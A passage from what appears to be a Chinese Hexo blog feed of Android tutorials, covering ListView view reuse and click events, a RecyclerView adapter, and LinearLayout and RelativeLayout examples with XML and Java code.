LayoutInflater.from(getContext()).inflate(resouceId,patrent,<span class="keyword">false</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     view=converView;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中在getView( )方法进行了判断，如果converView为null，则使用LayoutInflater去加载布局，如果不为null则直接对convertView进行重用，这样提高了ListView的运行效率。最重要使用了view=converView</p><h2 id="4-ListView点击事件"><a href="#4-ListView点击事件" class="headerlink" title="4.ListView点击事件"></a>4.ListView点击事件</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    inithero();</span><br><span class="line">    HeroAdapter adapter=<span class="keyword">new</span> HeroAdapter(MainActivity.<span class="keyword">this</span>,R.layout.fruit_item,herolist);</span><br><span class="line">    ListView listView=(ListView) findViewById(R.id.list_view);</span><br><span class="line">    listView.setAdapter(adapter);</span><br><span class="line">    listView.setOnItemClickListener(<span class="keyword">new</span> AdapterView.OnItemClickListener() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onItemClick</span><span class="params">(AdapterView&lt;?&gt; parent, View view, <span class="keyword">int</span> position, <span class="keyword">long</span> id)</span> </span>&#123;</span><br><span class="line">            <span class="comment">//获得列表中他的位置</span></span><br><span class="line">            hero hero_temp=herolist.get(position);</span><br><span class="line">            Toast.makeText(MainActivity.<span class="keyword">this</span>,hero_temp.getName(),Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用了listView.setOnItemClickListener( )设置了一个监听器，当用户点击了ListView任何一个子项时，就会回调onItemClick( )方法，在这个方法中可以通过position参数判断出用户点击的是哪一个子项，然后获得相应的结果。</p><h2 id="5-RecycleView的基本用法"><a href="#5-RecycleView的基本用法" class="headerlink" title="5.RecycleView的基本用法"></a>5.RecycleView的基本用法</h2><p>和百分比布局类似，RecycleView也属于新增的控件，为了让RecyclerView在所有Android版本上都能使用，将RecycleVuew定义在了support库中，因此，想要RecycleView这个控件，首先需要在项目的build.gradle添加相应的依赖库</p><p>打开app/build.gradle文件，在dependencies闭包中添加入下内容:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compile &#x27;com.android.support:recyclerview-v7:24.2.1&#x27;</span><br></pre></td></tr></table></figure><p>接下来需要为RecyclerView准备一个适配器，新建heroAdapter类，让这个适配器继承自RecycleView.Adapter，并泛型指定为HeroAdapter.ViewHolder，其中，HeroAdapter.ViewHolder是在heroAdapter中定义的一个内部类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.listviewtest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.view.LayoutInflater;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.ViewGroup;</span><br><span class="line"><span class="keyword">import</span> android.widget.ArrayAdapter;</span><br><span class="line"><span class="keyword">import</span> android.widget.ImageView;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.recyclerview.widget.RecyclerView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeoutException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HeroAdapter</span> <span class="keyword">extends</span> <span class="title">RecyclerView</span>.<span class="title">Adapter</span>&lt;<span class="title">HeroAdapter</span>.<span class="title">ViewHolder</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;hero&gt; mheroLsit;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ViewHolder</span> <span class="keyword">extends</span> <span class="title">RecyclerView</span>.<span class="title">ViewHolder</span></span>&#123;</span><br><span class="line">        ImageView heroImage;</span><br><span class="line">        TextView heroname;</span><br><span class="line">        <span class="function"><span class="keyword">public</span>  <span class="title">ViewHolder</span><span class="params">(View view)</span></span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(view);</span><br><span class="line">            heroImage=(ImageView) view.findViewById(R.id.hero_image);</span><br><span class="line">            heroname=(TextView) view.findViewById(R.id.hero_name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="title">HeroAdapter</span><span class="params">(List&lt;hero&gt; heroList)</span></span>&#123;</span><br><span class="line">        mheroLsit=heroList;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  ViewHolder <span class="title">onCreateViewHolder</span><span class="params">(ViewGroup parent,<span class="keyword">int</span> ViewType)</span></span>&#123;</span><br><span class="line">        View view=LayoutInflater.from(parent.getContext()).inflate(R.layout.fruit_item,parent,<span class="keyword">false</span>);</span><br><span class="line">        ViewHolder holder=<span class="keyword">new</span> ViewHolder(view);</span><br><span class="line">        <span class="keyword">return</span> holder;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onBindViewHolder</span><span class="params">(ViewHolder holder,<span class="keyword">int</span> position)</span></span>&#123;</span><br><span class="line">        hero hero_temp=mheroLsit.get(position);</span><br><span class="line">        holder.heroImage.setImageResource(hero_temp.getImageid());</span><br><span class="line">        holder.heroname.setText(hero_temp.getName());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getItemCount</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  mheroLsit.size();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ViewHolder</span> <span class="keyword">extends</span> <span class="title">RecyclerView</span>.<span class="title">ViewHolder</span></span>&#123;</span><br><span class="line">        ImageView heroImage;</span><br><span class="line">        TextView heroname;</span><br><span class="line">        <span class="function"><span class="keyword">public</span>  <span class="title">ViewHolder</span><span class="params">(View view)</span></span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(view);</span><br><span class="line">            heroImage=(ImageView) view.findViewById(R.id.hero_image);</span><br><span class="line">            heroname=(TextView) view.findViewById(R.id.hero_name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先定义了一个内部类ViewHolder，ViewHolder要继承自RecycleView.ViewHolder。然后ViewHolder的构造函数中要传入一个View参数，这个参数通常是RecycleView子项的最外层布局，最后可以通过findViewById( )方法来获取布局中的ImageView和TextView( )的实例</p><p><strong>由于HeroAdapter是继承自RecyclerView.Adapter的，那就必须重写其中的三个方法</strong></p><p>public  ViewHolder onCreateViewHolder( )用于创建一个ViewHolder实例，并把加载出来的布局传入到构造函数当中，最后将的实例返回。</p><p>public void onBindViewHolder( )方法适用于对RecyclerView子项的数据进行赋值，会在每个子项被滚动到屏幕内的时候执行，这里我们通过position参数得到当前项的hero实例，然后将数据设置到ViewHolder的ImageView和TextView当中。</p><p>public int getItemCount( )用于告诉RecyclerView一共有多少子项，直接放回数据源的长度</p><p><img src="/2020/09/22/Android/Android-ListView%E6%8E%A7%E4%BB%B6/image-20200924140623673.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-ListView%E6%8E%A7%E4%BB%B6/image-20200924140623673.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200924140623673"></p><h2 id="6-RecycleView的点击事件"><a href="#6-RecycleView的点击事件" class="headerlink" title="6.RecycleView的点击事件"></a>6.RecycleView的点击事件</h2><p><img src="/2020/09/22/Android/Android-ListView%E6%8E%A7%E4%BB%B6/image-20200924141625683.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-ListView%E6%8E%A7%E4%BB%B6/image-20200924141625683.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200924141625683"></p><p><img src="/2020/09/22/Android/Android-ListView%E6%8E%A7%E4%BB%B6/image-20200924141634239.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-ListView%E6%8E%A7%E4%BB%B6/image-20200924141634239.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200924141634239"></p><p><img src="/2020/09/22/Android/Android-ListView%E6%8E%A7%E4%BB%B6/image-20200924141644777.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-ListView%E6%8E%A7%E4%BB%B6/image-20200924141644777.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200924141644777"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android-基本布局</title>
      <link href="/2020/09/22/Android/Android-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/"/>
      <url>/2020/09/22/Android/Android-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="线性布局"><a href="#线性布局" class="headerlink" title="线性布局"></a>线性布局</h1><p><strong>LinearLayout</strong>又称为线性布局，所包含的控件在线性方向上依次排列，之前通过<code>android:orientation=&quot;vertical&quot;</code>表明了排列方向是vertical即是垂直排列。如果指定的是horizontal，控件就会在水平方向上排列</p><p><strong>垂直排列</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button1&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;button&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button2&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;button&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button3&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;button&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>垂直排列<img src="/2020/09/22/Android/Android-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/image-20200922192323487.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/image-20200922192323487.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922192323487"></strong></p><p>修改<code>android:orientation=&quot;vertical&quot;</code>为<code>android:orientation=&quot;horizontal&quot;</code></p><p><strong>水平排列</strong><img src="/2020/09/22/Android/Android-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/image-20200922192553739.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/image-20200922192553739.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922192553739"></p><h2 id="区分android-layout-gravity与android-gravity"><a href="#区分android-layout-gravity与android-gravity" class="headerlink" title="区分android:layout_gravity与android:gravity"></a><strong>区分<code>android:layout_gravity</code>与<code>android:gravity</code></strong></h2><p>android:layout_gravity 用于指定控件在布局中的对齐方式</p><p>android:gravity指定文字在控件中的对齐方式</p><p>当排列方向是horizontal时，只有垂直方向上的对齐方式才会生效，水平方向上的长度是不固定的，每添加一个控件，水平方向上的长度都会发生改变，因而无法指定该方向上的对齐方式。</p><p>当排列方向是vertical时，只要垂直方向上的对齐方式才会生效。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">android:layout_gravity=&quot;top&quot;</span><br><span class="line">android:layout_gravity=&quot;center_vertical&quot;</span><br><span class="line">android:layout_gravity=&quot;bottom&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/09/22/Android/Android-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/image-20200922195129099.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/image-20200922195129099.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922195129099"></p><h2 id="Layout-weight"><a href="#Layout-weight" class="headerlink" title="Layout_weight"></a>Layout_weight</h2><p>对于该属性允许使用比例方式来指定控件的大小，在手机屏幕的适配性方面可以起到非常重要的作用。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;horizontal&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/input_message&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_weight</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/send&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_weight</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;发送文件&quot;</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/09/22/Android/Android-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/image-20200922195709178.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/image-20200922195709178.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922195709178"></p><p>可以看到其中的 <code>android:layout_width=&quot;0dp&quot;</code>，但是由于使用了 <code>android:layout_weight=&quot;1&quot;</code>属性后，此时的控件长度由<code>androi:layout_weight</code>属性，此时的控件宽度就不应该由前面来控制</p><p>此时可以看到属性值设置为1，表示EditText和Button在水平方向上平分宽度<img src="/2020/09/22/Android/Android-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/image-20200922200320838.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/image-20200922200320838.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922200320838"></p><p><img src="/2020/09/22/Android/Android-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/image-20200922200519651.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/image-20200922200519651.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200922200519651"></p><p>上图是将button的layout_weight改为”wrap_content”</p><h1 id="相对布局"><a href="#相对布局" class="headerlink" title="相对布局"></a>相对布局</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">RelativeLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button1&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;按钮1&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_alignParentLeft</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_alignParentTop</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button2&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;按钮2&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_alignParentRight</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_alignParentTop</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button3&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;按钮3&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_alignParentLeft</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_alignParentBottom</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button4&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;按钮4&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_alignParentRight</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_alignParentBottom</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button5&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;按钮5&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_centerInParent</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">      /&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">RelativeLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/09/22/Android/Android-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/image-20200922201421666.png" class="lazyload" data-srcset="/2020/09/22/Android/Android-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/image-20200922201421666.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" 